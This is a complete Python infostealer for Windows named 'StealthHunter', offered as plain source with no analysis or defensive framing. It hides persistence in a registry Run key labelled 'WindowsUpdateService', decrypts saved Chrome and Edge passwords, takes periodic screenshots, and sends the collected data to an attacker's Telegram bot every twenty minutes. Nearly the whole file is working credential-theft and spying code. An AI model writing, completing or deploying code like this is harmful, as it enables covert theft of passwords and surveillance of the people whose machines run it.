import os
import json
import sqlite3
import shutil
import requests
import tempfile
import win32crypt
from Crypto.Cipher import AES
import base64
import time
from datetime import datetime, timedelta
import threading
from mss import mss
import getpass
import winreg

# ===== CONFIGURATION =====
BOT_TOKEN = "..........................................."
CHAT_ID = "................."
SCREENSHOT_INTERVAL = 1800  # 30 minutes in seconds
EXFIL_INTERVAL = 1200       # 20 minutes in seconds
# =========================

class StealthHunter:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.data_package = {
            "system_info": self._get_system_info(),
            "chrome_data": [],
            "edge_data": [],
            "screenshots": []
        }
        self.telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        self.session = requests.Session()
        self._setup_persistence()

    def _get_system_info(self):
        return {
            "user": getpass.getuser(),
            "hostname": os.environ.get("COMPUTERNAME", "UNKNOWN"),
            "os": os.environ.get("OS", "Windows")
        }

    def _setup_persistence(self):
        try:
            exe_path = os.path.abspath(sys.argv[0])
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        except Exception:
            pass

    def _capture_screenshot(self):
        with mss() as sct:
            filename = os.path.join(self.temp_dir, f"ss_{int(time.time())}.png")
            sct.shot(output=filename)
            return filename

    def _decrypt_password(self, buffer, key):
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return ""

    def _get_browser_passwords(self, browser_path):
        data = []
        login_db = os.path.join(browser_path, "Login Data")
        local_state = os.path.join(browser_path, "Local State")

        if not os.path.exists(login_db):
            return data

        temp_db = os.path.join(self.temp_dir, "temp_login_db")
        shutil.copy2(login_db, temp_db)

        try:
            with open(local_state, "r") as f:
                encrypted_key = json.load(f)["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key)[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                password = self._decrypt_password(row[2], master_key)
                if password:
                    data.append({
                        "url": row[0],
                        "username": row[1],
                        "password": password
                    })
            conn.close()
        except Exception:
            pass
        finally:
            os.remove(temp_db)
        return data

    def _harvest_credentials(self):
        user_dir = os.path.expanduser("~")
        chrome_path = os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
        edge_path = os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
        
        self.data_package["chrome_data"] = self._get_browser_passwords(chrome_path)
        self.data_package["edge_data"] = self._get_browser_passwords(edge_path)

    def _exfiltrate_data(self):
        try:
            # Package data
            data_file = os.path.join(self.temp_dir, f"system_data_{int(time.time())}.json")
            with open(data_file, "w") as f:
                json.dump(self.data_package, f)
            
            # Send via Telegram
            with open(data_file, "rb") as f:
                files = {"document": f}
                data = {"chat_id": CHAT_ID}
                self.session.post(self.telegram_url, data=data, files=files)
            
            # Cleanup
            os.remove(data_file)
            for screenshot in self.data_package["screenshots"]:
                if os.path.exists(screenshot):
                    os.remove(screenshot)
            
            # Reset package
            self.data_package["chrome_data"] = []
            self.data_package["edge_data"] = []
            self.data_package["screenshots"] = []
        except Exception:
            pass

    def _screenshot_loop(self):
        while True:
            try:
                ss_path = self._capture_screenshot()
                self.data_package["screenshots"].append(ss_path)
            except Exception:
                pass
            time.sleep(SCREENSHOT_INTERVAL)

    def _exfil_loop(self):
        while True:
            try:
                self._harvest_credentials()
                self._exfiltrate_data()
            except Exception:
                pass
            time.sleep(EXFIL_INTERVAL)

    def run(self):
        # Start threads
        threading.Thread(target=self._screenshot_loop, daemon=True).start()
        threading.Thread(target=self._exfil_loop, daemon=True).start()
        
        # Keep main thread alive
        while True:
            time.sleep(3600)

if __name__ == "__main__":
    hunter = StealthHunter()
    hunter.run()
